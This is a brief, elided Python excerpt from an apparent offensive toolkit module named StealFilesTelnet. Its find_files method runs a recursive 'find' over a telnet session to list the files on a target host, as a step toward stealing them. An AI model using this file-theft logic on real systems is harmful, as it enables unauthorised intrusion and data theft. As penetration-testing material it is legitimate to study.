...
class StealFilesTelnet:
    ...
    def _read_until_marker(self, tn, marker, timeout=30):
    ...
    def find_files(self, tn, dir_path, ip=None, mac=None):
        ...
        try:
            if self.shared_data.orchestrator_should_exit:
                return []
            # Use marker-based read to avoid telnet expect() hanging
            logger.info(f"Starting file discovery on {ip}...")
            tn.write(f'find {dir_path} -type f -maxdepth 10 2>/dev/null; echo "FIND_DONE"\n'.encode('ascii'))
            raw_output = self._read_until_marker(tn, b"FIND_DONE", timeout=30)
